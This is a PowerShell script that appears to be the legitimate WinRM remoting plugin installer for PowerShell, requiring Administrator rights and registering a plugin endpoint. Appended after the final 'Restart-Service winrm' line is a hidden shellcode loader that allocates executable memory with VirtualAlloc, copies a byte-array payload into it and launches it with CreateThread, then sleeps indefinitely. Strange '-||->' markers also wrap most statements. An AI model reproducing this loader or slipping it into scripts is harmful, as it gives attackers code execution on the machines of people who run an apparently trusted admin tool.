


















[CmdletBinding(DefaultParameterSetName = "NotByPath")]
param
(
    [parameter(Mandatory = $true, ParameterSetName = "ByPath")]
    [switch]$Force,
    [string]
    $PowerShellHome
)

 -||-> Set-StrictMode -Version Latest <-||- 

 -||-> if ( -||-> ! ( -||-> [Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent() <-||- ).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator") <-||- )
{
     -||-> Write-Error "WinRM registration requires Administrator rights. To run this cmdlet, start PowerShell with the `"Run as administrator`" option." <-||- 
    return
} <-||- 
 -||-> function Register-WinRmPlugin
{
    param
    (
        
        
        
        
        [string]
        [parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        $pluginAbsolutePath,

        
        
        
        [string]
        [parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        $pluginEndpointName
    )

     -||-> $regKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WSMAN\Plugin\$pluginEndpointName" <-||- 

     -||-> $pluginArchitecture = "64" <-||- 
     -||-> if ( -||-> $env:PROCESSOR_ARCHITECTURE -match "x86" -or $env:PROCESSOR_ARCHITECTURE -eq "ARM" <-||- )
    {
         -||-> $pluginArchitecture = "32" <-||- 
    } <-||- 
     -||-> $regKeyValueFormatString = @"
<PlugInConfiguration xmlns="http://schemas.microsoft.com/wbem/wsman/1/config/PluginConfiguration" Name="{0}" Filename="{1}"
    SDKVersion="2" XmlRenderingType="text" Enabled="True" OutputBufferingMode="Block" ProcessIdleTimeoutSec="0" Architecture="{2}"
    UseSharedProcess="false" RunAsUser="" RunAsPassword="" AutoRestart="false">
    <InitializationParameters>
        <Param Name="PSVersion" Value="7.0"/>
    </InitializationParameters>
    <Resources>
        <Resource ResourceUri="http://schemas.microsoft.com/powershell/{0}" SupportsOptions="true" ExactMatch="true">
            <Security Uri="http://schemas.microsoft.com/powershell/{0}" ExactMatch="true"
            Sddl="O:NSG:BAD:P(A;;GA;;;BA)S:P(AU;FA;GA;;;WD)(AU;SA;GXGW;;;WD)"/>
            <Capability Type="Shell"/>
        </Resource>
    </Resources>
    <Quotas IdleTimeoutms="7200000" MaxConcurrentUsers="5" MaxProcessesPerShell="15" MaxMemoryPerShellMB="1024" MaxShellsPerUser="25"
    MaxConcurrentCommandsPerShell="1000" MaxShells="25" MaxIdleTimeoutms="43200000"/>
</PlugInConfiguration>
"@ <-||- 
     -||-> $valueString = $regKeyValueFormatString -f $pluginEndpointName, $pluginAbsolutePath, $pluginArchitecture <-||- 

     -||-> New-Item $regKey -Force > $null <-||- 
     -||-> New-ItemProperty -Path $regKey -Name ConfigXML -Value $valueString > $null <-||- 
} <-||- 

 -||-> function New-PluginConfigFile
{
    [CmdletBinding(SupportsShouldProcess, ConfirmImpact="Medium")]
    param
    (
        [string]
        [parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        $pluginFile,

        [string]
        [parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        $targetPsHomeDir
    )

    
    
     -||-> Set-Content -Path $pluginFile -Value "PSHOMEDIR=$targetPsHomeDir" -ErrorAction Stop <-||- 
     -||-> Add-Content -Path $pluginFile -Value "CORECLRDIR=$targetPsHomeDir" -ErrorAction Stop <-||- 

     -||-> Write-Verbose "Created Plugin Config File: $pluginFile" -Verbose <-||- 
} <-||- 

 -||-> function Install-PluginEndpoint {
    [CmdletBinding(SupportsShouldProcess, ConfirmImpact="Medium")]
    param (
        [Parameter()] [bool] $Force,
        [switch]
        $VersionIndependent
    )

    
    
    
    
    
    
     -||-> if ( -||-> -not [String]::IsNullOrEmpty($PowerShellHome) <-||- )
    {
         -||-> $targetPsHome = $PowerShellHome <-||- 
         -||-> $targetPsVersion =  -||-> & "$targetPsHome\pwsh" -NoProfile -Command '$PSVersionTable.PSVersion.ToString()' <-||-  <-||- 
    }
    else
    {
        
         -||-> $targetPsHome = $PSHOME <-||- 
         -||-> $targetPsVersion = $PSVersionTable.PSVersion.ToString() <-||- 
    } <-||- 
     -||-> Write-Verbose "PowerShellHome: $targetPsHome" -Verbose <-||- 

    
    
    
     -||-> if ( -||-> $VersionIndependent <-||- ) {
         -||-> $dotPos = $targetPsVersion.IndexOf(".") <-||- 
         -||-> if ( -||-> $dotPos -ne -1 <-||- ) {
             -||-> $targetPsVersion = $targetPsVersion.Substring(0, $dotPos) <-||- 
        } <-||- 
    } <-||- 

     -||-> Write-Verbose "Using PowerShell Version: $targetPsVersion" -Verbose <-||- 

     -||-> $pluginEndpointName = "PowerShell.$targetPsVersion" <-||- 

     -||-> $endPoint =  -||-> Get-PSSessionConfiguration $pluginEndpointName -Force:$Force -ErrorAction silentlycontinue 2>&1 <-||-  <-||- 

    
     -||-> if ( -||-> $endpoint -and !$Force <-||- )
    {
         -||-> Write-Error -Category ResourceExists -ErrorId "PSSessionConfigurationExists" -Message "Endpoint $pluginEndpointName already exists." <-||- 
        return
    } <-||- 

     -||-> if ( -||-> !$PSCmdlet.ShouldProcess($pluginEndpointName) <-||- ) {
        return
    } <-||- 

     -||-> if ( -||-> $PSVersionTable.PSVersion -lt "6.0" <-||- )
    {
        
        
         -||-> $pluginBasePath =  -||-> Join-Path "C:\Windows\System32\PowerShell" $targetPsVersion <-||-  <-||- 
    }
    else
    {
         -||-> $pluginBasePath =  -||-> Join-Path ( -||-> [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Windows) + "\System32\PowerShell" <-||- ) $targetPsVersion <-||-  <-||- 
    } <-||- 

     -||-> $resolvedPluginAbsolutePath = "" <-||- 
     -||-> if ( -||-> ! ( -||-> Test-Path $pluginBasePath <-||- ) <-||- )
    {
         -||-> Write-Verbose "Creating $pluginBasePath" <-||- 
         -||-> $resolvedPluginAbsolutePath =  -||-> New-Item -Type Directory -Path $pluginBasePath <-||-  <-||- 
    }
    else
    {
         -||-> $resolvedPluginAbsolutePath =  -||-> Resolve-Path $pluginBasePath <-||-  <-||- 
    } <-||- 

     -||-> $pluginPath =  -||-> Join-Path $resolvedPluginAbsolutePath "pwrshplugin.dll" <-||-  <-||- 

    
     -||-> Copy-Item $targetPsHome\pwrshplugin.dll $resolvedPluginAbsolutePath -Force -Verbose -ErrorAction Stop <-||- 

     -||-> $pluginFile =  -||-> Join-Path $resolvedPluginAbsolutePath "RemotePowerShellConfig.txt" <-||-  <-||- 
     -||-> New-PluginConfigFile $pluginFile ( -||-> Resolve-Path $targetPsHome <-||- ) <-||- 

    
     -||-> Register-WinRmPlugin $pluginPath $pluginEndpointName <-||- 

    
    
    
    
    

     -||-> if ( -||-> ! ( -||-> Test-Path $pluginFile <-||- ) <-||- )
    {
        throw  -||-> "WinRM Plugin configuration file not created. Expected = $pluginFile" <-||- 
    } <-||- 

     -||-> if ( -||-> ! ( -||-> Test-Path $resolvedPluginAbsolutePath\pwrshplugin.dll <-||- ) <-||- )
    {
        throw  -||-> "WinRM Plugin DLL missing. Expected = $resolvedPluginAbsolutePath\pwrshplugin.dll" <-||- 
    } <-||- 

     -||-> try
    {
         -||-> Write-Host "`nGet-PSSessionConfiguration $pluginEndpointName" -foregroundcolor "green" <-||- 
         -||-> Get-PSSessionConfiguration $pluginEndpointName -ErrorAction Stop <-||- 
    }
    catch [Microsoft.PowerShell.Commands.WriteErrorException]
    {
        throw  -||-> "No remoting session configuration matches the name $pluginEndpointName." <-||- 
    } <-||- 
} <-||- 

 -||-> Install-PluginEndpoint -Force $Force <-||- 
 -||-> Install-PluginEndpoint -Force $Force -VersionIndependent <-||- 

 -||-> Write-Host "Restarting WinRM to ensure that the plugin configuration change takes effect.`nThis is required for WinRM running on Windows SKUs prior to Windows 10." -foregroundcolor Magenta <-||- 
 -||-> Restart-Service winrm <-||- 


 -||-> $jrM = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $jrM -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xb8,0x0f,0x10,0x99,0x8b,0xdb,0xd6,0xd9,0x74,0x24,0xf4,0x5f,0x31,0xc9,0xb1,0x47,0x83,0xef,0xfc,0x31,0x47,0x0f,0x03,0x47,0x00,0xf2,0x6c,0x77,0xf6,0x70,0x8e,0x88,0x06,0x15,0x06,0x6d,0x37,0x15,0x7c,0xe5,0x67,0xa5,0xf6,0xab,0x8b,0x4e,0x5a,0x58,0x18,0x22,0x73,0x6f,0xa9,0x89,0xa5,0x5e,0x2a,0xa1,0x96,0xc1,0xa8,0xb8,0xca,0x21,0x91,0x72,0x1f,0x23,0xd6,0x6f,0xd2,0x71,0x8f,0xe4,0x41,0x66,0xa4,0xb1,0x59,0x0d,0xf6,0x54,0xda,0xf2,0x4e,0x56,0xcb,0xa4,0xc5,0x01,0xcb,0x47,0x0a,0x3a,0x42,0x50,0x4f,0x07,0x1c,0xeb,0xbb,0xf3,0x9f,0x3d,0xf2,0xfc,0x0c,0x00,0x3b,0x0f,0x4c,0x44,0xfb,0xf0,0x3b,0xbc,0xf8,0x8d,0x3b,0x7b,0x83,0x49,0xc9,0x98,0x23,0x19,0x69,0x45,0xd2,0xce,0xec,0x0e,0xd8,0xbb,0x7b,0x48,0xfc,0x3a,0xaf,0xe2,0xf8,0xb7,0x4e,0x25,0x89,0x8c,0x74,0xe1,0xd2,0x57,0x14,0xb0,0xbe,0x36,0x29,0xa2,0x61,0xe6,0x8f,0xa8,0x8f,0xf3,0xbd,0xf2,0xc7,0x30,0x8c,0x0c,0x17,0x5f,0x87,0x7f,0x25,0xc0,0x33,0xe8,0x05,0x89,0x9d,0xef,0x6a,0xa0,0x5a,0x7f,0x95,0x4b,0x9b,0xa9,0x51,0x1f,0xcb,0xc1,0x70,0x20,0x80,0x11,0x7d,0xf5,0x3d,0x17,0xe9,0x36,0x69,0x1f,0x8c,0xde,0x68,0x20,0x4f,0xa4,0xe4,0xc6,0x1f,0x8a,0xa6,0x56,0xdf,0x7a,0x07,0x07,0xb7,0x90,0x88,0x78,0xa7,0x9a,0x42,0x11,0x4d,0x75,0x3b,0x49,0xf9,0xec,0x66,0x01,0x98,0xf1,0xbc,0x6f,0x9a,0x7a,0x33,0x8f,0x54,0x8b,0x3e,0x83,0x00,0x7b,0x75,0xf9,0x86,0x84,0xa3,0x94,0x26,0x11,0x48,0x3f,0x71,0x8d,0x52,0x66,0xb5,0x12,0xac,0x4d,0xce,0x9b,0x38,0x2e,0xb8,0xe3,0xac,0xae,0x38,0xb2,0xa6,0xae,0x50,0x62,0x93,0xfc,0x45,0x6d,0x0e,0x91,0xd6,0xf8,0xb1,0xc0,0x8b,0xab,0xd9,0xee,0xf2,0x9c,0x45,0x10,0xd1,0x1c,0xb9,0xc7,0x1f,0x6b,0xd3,0xdb <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $7IF4=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $7IF4.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$7IF4,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



